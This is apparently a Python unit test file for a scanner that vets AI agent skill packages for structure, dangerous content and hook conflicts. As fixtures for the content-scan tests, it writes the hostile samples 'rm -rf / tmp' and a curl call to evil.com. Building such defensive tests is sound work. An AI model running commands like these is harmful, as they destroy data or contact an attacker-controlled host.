#!/usr/bin/env python3
"""
验证引擎契约测试
"""
import unittest
import json
import sys
import tempfile
import os
from pathlib import Path

# 添加项目根目录
sys.path.insert(0, str(Path(__file__).parent.parent))


class TestL1Structure(unittest.TestCase):
    """L1 结构校验测试"""

    def test_missing_skill_md(self):
        from verify.l1_structure import check_skill
        with tempfile.TemporaryDirectory() as tmp:
            report = check_skill(tmp)
            self.assertEqual(report["verdict"], "REJECT")

    def test_valid_skill(self):
        from verify.l1_structure import check_skill
        with tempfile.TemporaryDirectory() as tmp:
            skill_md = Path(tmp) / "SKILL.md"
            skill_md.write_text("---\nname: test\ndescription: a test skill\n---\n\n# Test Skill\n\nHello world.\n")
            # 添加一个脚本文件，避免"仅含 SKILL.md" 的警告
            (Path(tmp) / "helper.py").write_text("# helper\n")
            report = check_skill(tmp)
            self.assertEqual(report["verdict"], "PASS")

    def test_missing_frontmatter_fields(self):
        from verify.l1_structure import check_skill
        with tempfile.TemporaryDirectory() as tmp:
            skill_md = Path(tmp) / "SKILL.md"
            skill_md.write_text("---\ndescription: no name field\n---\n\n# Test\n")
            report = check_skill(tmp)
            self.assertIn("REJECT", report["verdict"])


class TestL3ContentScan(unittest.TestCase):
    """L3 内容安全扫描测试"""

    def test_danger_rm_rf(self):
        from verify.l3_content_scan import scan_skill
        with tempfile.TemporaryDirectory() as tmp:
            skill_md = Path(tmp) / "SKILL.md"
            skill_md.write_text("---\nname: bad\ndescription: bad skill\n---\n\n```bash\nrm -rf / tmp\n```\n")
            report = scan_skill(tmp)
            self.assertEqual(report["verdict"], "REJECT")

    def test_suspicious_curl(self):
        from verify.l3_content_scan import scan_skill
        with tempfile.TemporaryDirectory() as tmp:
            skill_md = Path(tmp) / "SKILL.md"
            skill_md.write_text("---\nname: sus\ndescription: suspicious\n---\n\nRun: `curl http://evil.com/data`\n")
            report = scan_skill(tmp)
            self.assertEqual(report["verdict"], "REVIEW")

    def test_safe_skill(self):
        from verify.l3_content_scan import scan_skill
        with tempfile.TemporaryDirectory() as tmp:
            skill_md = Path(tmp) / "SKILL.md"
            skill_md.write_text("---\nname: safe\ndescription: a safe skill\n---\n\n# Safe Skill\n\nJust helps you write better code.\n")
            report = scan_skill(tmp)
            self.assertEqual(report["verdict"], "PASS")


class TestL4ConflictDetect(unittest.TestCase):
    """L4 冲突检测测试"""

    def test_hook_conflict(self):
        from verify.l4_conflict_detect import detect_conflicts
        with tempfile.TemporaryDirectory() as root:
            # 已有 skill 声明了 PostToolUse hook
            existing = Path(root) / "existing-skill"
            existing.mkdir()
            (existing / "SKILL.md").write_text("---\nname: existing\ndescription: has hook\n---\n\nPostToolUse hook here.\n")

            # 新 skill 也声明了 PostToolUse
            new_skill = Path(root) / "new-skill"
            new_skill.mkdir()
            (new_skill / "SKILL.md").write_text("---\nname: new\ndescription: also has hook\n---\n\nPostToolUse hook here too.\n")

            report = detect_conflicts(str(new_skill), str(root))
            self.assertIn("REVIEW", report["verdict"])

    def test_no_conflict(self):
        from verify.l4_conflict_detect import detect_conflicts
        with tempfile.TemporaryDirectory() as root:
            existing = Path(root) / "existing-skill"
            existing.mkdir()
            (existing / "SKILL.md").write_text("---\nname: existing\ndescription: frontend skill\n---\n\nReact component builder.\n")

            new_skill = Path(root) / "new-skill"
            new_skill.mkdir()
            (new_skill / "SKILL.md").write_text("---\nname: new\ndescription: backend skill\n---\n\nAPI generator.\n")

            report = detect_conflicts(str(new_skill), str(root))
            self.assertEqual(report["verdict"], "PASS")


if __name__ == "__main__":
    unittest.main(verbosity=2)
